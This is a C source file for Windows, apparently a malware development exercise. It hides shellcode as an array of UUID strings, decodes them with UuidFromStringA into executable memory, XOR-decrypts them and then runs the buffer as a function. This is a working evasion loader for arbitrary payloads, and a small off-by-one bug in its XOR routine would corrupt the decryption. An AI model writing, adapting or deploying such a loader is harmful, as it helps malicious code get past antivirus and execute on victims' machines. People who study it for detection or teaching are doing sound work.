#include <Windows.h>
#include <stdio.h>

#define NumberOfElements 17

char* UuidArray[] = {
		"394FF356-E81E-BB6A-CCDD-AF51EBEB9E8C", "699B48B8-95A9-5265-CAF3-478FF64821E9", "726595EC-F3FA-6AC3-A44A-E78A0595DFC0",
		"A1AD8706-2CEC-FA8A-0D14-E341AB7A2E30", "F3FB41BC-8F47-8BCE-E887-84DC3E8B2A33", "48EEDDCC-7B2F-BAB8-A601-7AEB4795F644",
		"94ECFB21-D0EF-ED49-8422-2741218F4495", "8AE7D6EF-9505-C0DF-06FA-0D14E341AB7A", "F19B3DF4-B8E6-F980-E645-936AB905B644",
		"94E8FB21-D0EF-FACC-47D1-A64421FBD094", "30EBD0EF-55C8-01A6-7AFA-949CB65EF3E1", "59AF858D-E1EB-5E84-0220-EBE9333DB641",
		"5684E1F3-E9FC-44FD-3322-B34810BACCDD", "BBAA00EE-95CC-8D63-ABBA-CCDDAFBA9B30", "D5115AA3-5B11-F7D1-E441-101D596073FF",
		"194FF37F-3CC6-C7AC-C65D-15E0DFBE779A", "D1C572FD-84CC-89AF-7044-19BE8F6CC9BB"
};

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
	);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	RPC_STATUS 	STATUS = NULL;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	//pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

int main() {

	PBYTE	pDAddress = NULL;
	SIZE_T	sDSize = NULL;

	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDAddress, &sDSize))
		return -1;

	printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
	for (size_t i = 0; i < sDSize; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", pDAddress[i]);
	}

	printf("\n");
	printf("[+] Decrypting XORed shellcode bytes...");
	XorFunction(pDAddress, sDSize, randomKey, sizeof(randomKey));

	(*(VOID(*)()) pDAddress)();
	// Free the executable buffer
	VirtualFree(pDAddress, 0, MEM_RELEASE);

	printf("\n\n[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
